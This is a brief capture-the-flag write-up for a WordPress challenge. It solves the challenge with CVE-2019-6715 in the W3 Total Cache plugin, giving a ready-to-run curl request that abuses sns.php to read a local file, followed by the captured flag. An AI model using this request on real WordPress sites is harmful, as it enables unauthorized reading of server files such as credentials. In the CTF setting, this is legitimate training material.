# CTF Name – Dunder Mifflin Infinity

- **Category:** category
- **Points:** points

## Challenge

> The Dunder Miflin Infinity has been under construction for a while. As previously mentioned some of the components are also getting quite outdated....

> This is part 2 where you need to find a second flag on the WordPress site (flag.txt)

http://dminfinity.seekurity.com.au/

## Solution

CVE-2019-6715

Eg. https://github.com/random-robbie/cve-2019-6715

curl -X PUT --data '{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"file:/flag.txt"}' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36' http://dminfinity.seekurity.com.au/wp-content/plugins/w3-total-cache/pub/sns.php

```
flag{svy2PSW2ev5v4Fee}
```
